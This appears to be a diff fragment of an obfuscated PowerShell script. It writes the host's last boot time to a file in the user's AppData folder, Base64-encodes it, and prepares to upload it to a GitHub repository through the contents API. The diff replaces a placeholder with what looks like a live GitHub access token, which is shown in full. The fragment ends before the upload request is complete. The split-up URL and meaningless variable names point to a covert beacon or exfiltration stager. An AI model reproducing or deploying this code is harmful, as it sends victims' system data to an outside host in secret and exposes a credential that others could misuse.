@@ -4,7 +4,7 @@ $ffffjhejkhrtu3 = "$hgfjhgsaf-$cyhwjehbf-XXX-kkk.txt"
 $ssdjsvuewrjhtb = Join-Path $env:appdata $ffffjhejkhrtu3
 (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $ssdjsvuewrjhtb
 $aaahgy218sfdh = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" + "pos/devman1003/thmain/contents/store/" + $ffffjhejkhrtu3
-$gggwhjkjrh = "ghp_hahahah"
+$gggwhjkjrh = "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"
 $ffhuiwe9f7sd = Get-Content -Path $ssdjsvuewrjhtb -Encoding Byte
 $ffghy672jhdwe = [Convert]::ToBase64String($ffhuiwe9f7sd)
 $bbbhjdkhje = @{
